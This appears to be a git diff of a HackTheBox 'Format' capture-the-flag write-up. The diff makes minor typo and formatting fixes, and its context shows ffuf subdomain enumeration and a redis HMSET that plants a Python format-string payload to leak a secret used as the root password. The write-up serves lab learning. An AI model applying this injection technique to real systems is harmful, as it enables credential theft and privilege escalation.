@@ -44,7 +44,7 @@ After registering we can create micro blogs which create vhosts on the box
 
 Checking for vhosts, there's a `sunny` subdomain
 ```bash
-[blnkn@Kolossus](main %=):~/blnknlights.github.io/htb/machines/format% ffuf \                     2 ⨯
+[blnkn@Kolossus](main %=):~/blnknlights.github.io/htb/machines/format% ffuf \
   -c \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
   -u "http://microblog.htb" \
@@ -753,7 +753,7 @@ if(args.check):
 
 ```
 
-We control the keys from redis and they are used in a format string that is then printed to us, so we can use any of this keys in redis with curly braces to print the content of the variable we're after.    
+We control the keys from redis and they are used in a format string that is then printed to us, so we can use any of these keys in redis with curly braces to print the content of the variable we're after.    
 ```bash
 redis /var/run/redis/redis.sock> HMSET blnkn first-name "{license.__init__.__globals__[secret_encoded]}" last-name blnkn password blnkn username blnkn
 OK
@@ -780,7 +780,7 @@ Encrypted license key (distribute to customer):
 gAAAAABkaNx5eFFJOyYg6iEvxZqDlj4JOK3Vd05j2aEm1t0eLlNvwV10Od7nqUOi0m5L0fcqQgULOgmg3MGeBZ95XZwE_OxdNBPNg7YV7-k0al4m3VSSsl2o6-mVEQ5EjdGLE72Ej8sk39ugOcYK_B_v2SRfY6YDrL-5CcBSFhI5WH4CA0MPFV0gBbyB4aHxClDu6gdXbISk
 ```
 
-And as predicted is is the password for root
+And as predicted it is the password for root
 ```bash
 cooper@format:~$ su -
 Password:
